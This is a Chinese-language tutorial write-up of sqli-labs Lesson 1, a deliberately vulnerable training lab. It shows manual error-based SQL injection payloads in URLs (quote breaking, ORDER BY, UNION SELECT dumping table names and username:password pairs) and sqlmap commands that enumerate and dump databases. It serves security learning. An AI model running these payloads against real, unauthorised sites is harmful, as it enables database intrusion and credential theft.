---
title: sqli-labs lession 1 (基于错误的GET单引号字符型注入)
date: 2018-09-18 15:28:52
tags:
categories: sql注入
---
# sqli-labs lession 1 (基于错误的GET单引号字符型注入) #
---
## 登录界面 ##
![1](https://i.imgur.com/7iOF74D.png)
## 手注 ##

### 判断注入类型 ###
>sqli-labs 第一课很人性化地给予提示,在url处添加id。


`http://10.60.250.214/Less-1/?id=1`
![2](https://i.imgur.com/wwGtJ0S.png)
>由于是get请求方法,以后碰到就直接填写了。

输入单引号

`http://10.60.250.214/Less-1/?id=1'`

![3](https://i.imgur.com/Kgh75tO.png)

引起报错
`You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1`

根据报错信息,猜测加入的id'参数在SQL语句中应该被对称的单引号包含。

继续验证猜想:

`http://10.60.250.214/Less-1/?id=1' and '1'='1`

页面正常，这里不贴图了

继续检验

`http://10.60.250.214/Less-1/?id=1' and '1'='2`

页面异常

![4](https://i.imgur.com/6u8cFW1.png)

存在字符型的注入

在搭建的服务中可以查看SQL语句是怎么写的,就是下图中标记部分

![5](https://i.imgur.com/vibteUL.png)

`$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";`

通过get请求提交的数据会被$id接收,举个例子，上图中`1' and '1'='2`就是我手动输入的部分,在SQL语句中就变成这样:

`SELECT * FROM users WHERE id='1' and '1'='2' LIMIT 0,1`

可以发现我构造的单引号与SQL语句中的单引号形成了对称,最终变成了一个正常的SQL语句。

但是单单这样还是不够的,`and '1'='2' LIMIT 0,1`在SQL语句中还是会执行,可能会对我输入进行干扰。这就需要注释了。

mysql的注释方式有以下几种：

* 第一种:#	

	\#在url中编码为`%23`

* 第二种:-- (注意--后面还有个空格)

	空格的编码是`%20`

* 第三种:--+ 

	第二种的变形,浏览器会把`+`编码成空格

`'`的url编码为`%27`,下面的测试先把单引号用`%27`表示,空格用`%20`表示,#用`%23`,避免出问题。在url中输入如下:

> 第一种:#

`http://10.60.250.214/Less-1/?id=1%27%20%23`

![6](https://i.imgur.com/X5WsedG.png)

> 第二种：-- (注意--后面还有个空格)

`http://10.60.250.214/Less-1/?id=1%27%20--%20`

![7](https://i.imgur.com/CPbYISh.png)

> 第三种:--+

`http://10.60.250.214/Less-1/?id=1%27%20--+`

![8](https://i.imgur.com/TW7fFE7.png)

### 猜字段 ###

#### 猜字段数 ####

这里我采用第一种注释方式,当然其他的也可以。

`http://10.60.250.214/Less-1/?id=1%27%20order%20by%203%23`

这里我换了个hackbar插件,原来那个有bug

![9](https://i.imgur.com/ZIXMXUP.png)

order by 数字1~3显示的都与这个页面相同,表示至少有3个字段

`http://10.60.250.214/Less-1/?id=1%27%20order%20by%204%23`

![10](https://i.imgur.com/lfKFcjO.png)

图片上的报错信息是:

`SELECT * FROM users WHERE id='1' order by 4#' LIMIT 0,1
Unknown column '4' in 'order clause'`

说明第4个字段不存在,那就只有3个字段。

#### 猜字段排序 ####

使用union select联合查询,后面接查到的字段个数。如下:

`http://10.60.250.214/Less-1/?id=1%27%20union%20select%201,2,3%23`

![11](https://i.imgur.com/uyB1sZ5.png)

可是怎么让我填写的数字显示出来呢,这就是个问题了,查看一下源码:

![12](https://i.imgur.com/T9tGY5M.png)

标记的位置就是关键函数。mysql_fetch_array函数会从返回查询到的数据的一行,这里我查询到的是id=1的数据,改变id能查询到另外的数据,修改id=2。

`http://10.60.250.214/Less-1/?id=2%27%20union%20select%201,2,3%23`

![13](https://i.imgur.com/iQTBrk4.png)

显示出id=2的数据信息。

将id修改为数据表中不可能存在的一个数,前面查询会变为空,执行我们的联合查询语句。这里将id修改为-1。

`http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,2,3%23`

![14](https://i.imgur.com/EtoeD7e.png)

显示出字段顺序,推测字段中排序顺序应该是id,name,password。

### 获取数据库信息 ###
user():返回当前数据库连接使用的用户

database():返回当前数据库连接使用的数据库

version():返回当前数据库的版本

`http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,user(),database()%23`

![15](https://i.imgur.com/O4iLDlC.png)

### 获取表 ###

group_concat函数:将查询到的多行结果连接成字符串

`http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,user(),group_concat(table_name) from information_schema.tables where table_schema=database()%23`

![16](https://i.imgur.com/aW1ZQ52.png)

### 获取字段 ###

`http://10.60.250.214/Less-1/?id=-1%27%20union%20select%201,%20user(),group_concat(column_name)%20from%20INFORMATION_SCHEMA.COLUMNS%20WHERE%20TABLE_NAME=%27users%27%23`

![17](https://i.imgur.com/yXgseWp.png)

### 获取值 ###

`http://10.60.250.214/Less-1/?id=-1' union select 1,2,group_concat(username,':',password) from users%23`

![18](https://i.imgur.com/72LA4RH.png)

## SQLMAP ##

### 基础命令 ###

SQLMAP的基础命令如下：

>列举数据库

sqlmap -u “注入地址” -v 1 –-dbs

>当前数据库

sqlmap -u “注入地址” -v 1 –-current-db

>列数据库用户

sqlmap -u “注入地址” -v 1 –-users


>当前用户

sqlmap -u “注入地址” -v 1 –-current-user

>列举数据库的表名

sqlmap -u “注入地址” -v 1 -D “数据库” –-tables

>获取表的列名
sqlmap.py -u “注入地址” -v 1 -T “表名” -D “数据库” –-columns

>获取表中的数据
sqlmap.py -u “注入地址” -v 1 -T “表名” -D “数据库” -C “字段” –-dump

### 获取数据库 ###
**-u** 
<font color=#8470FF>
**指定url** 
</font>


**--dbs** 
<font color=#8470FF>
**爆破数据库** 
</font>

**--batch**
<font color=#8470FF>
**默认运行** 
</font>

**--technique**  
<font color=#8470FF>

指定sqlmap使用的检测技术

* B:Boolean-based-blind  （布尔型型注入）

* E:Error-based   （报错型注入）

* U:Union query-based  （联合注入）

* S:Starked queries   （通过sqlmap读取文件系统、操作系统、注册表必须 使用该参数，可多语句查询注入）

* T:Time-based blind  （基于时间延迟注入）

</font>

`sqlmap -u "http://10.60.250.214/Less-1/?id=1" --dbs --batch --technique B`

![20](https://i.imgur.com/6EobR3x.png)

![19](https://i.imgur.com/ZzNnuBy.png)

### 获取表 ###

`sqlmap -u "http://10.60.250.214/Less-1/?id=1" -v 1 -D security --tables`

![22](https://i.imgur.com/RbMVkf4.png)

![21](https://i.imgur.com/yFC9jZD.png)

### 获取表的列名 ###

`sqlmap -u "http://10.60.250.214/Less-1/?id=1" -v 1 -D security -T users --columns`

![24](https://i.imgur.com/keAEMDi.png)

![23](https://i.imgur.com/mkkn61S.png)

### 获取表中数据 ###

`sqlmap -u "http://10.60.250.214/Less-1/?id=1" -v 1 -D security -T users --columns --dump`

![26](https://i.imgur.com/hclOrZ5.png)

![25](https://i.imgur.com/qrbRqfl.png)